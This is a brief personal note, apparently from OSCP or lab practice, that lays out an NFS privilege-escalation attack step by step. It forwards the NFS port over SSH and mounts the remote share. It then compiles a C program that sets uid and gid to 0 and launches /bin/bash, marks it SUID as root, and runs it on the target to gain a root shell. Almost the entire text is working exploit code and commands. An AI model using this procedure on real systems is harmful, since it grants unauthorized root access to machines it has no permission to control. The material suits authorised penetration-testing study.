<https://medium.com/vieh-group/hacking-oscp-cheatsheet-ef63c43f919c>
search for NFS

ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049

mkdir my_share
mount -t nfs 127.0.0.1:/srv/share my_share
cd my_share

gedit shell.c
#include <unistd.h>
int main(){
  setuid(0);
  setgid(0);
  system("/bin/bash");
}

make sure you're root on your kali

gcc shell.c -o shell
chmod u+s shell

Then ssh back in. Go to the share they hosted. 

Trigger the script

./shell

root :) <3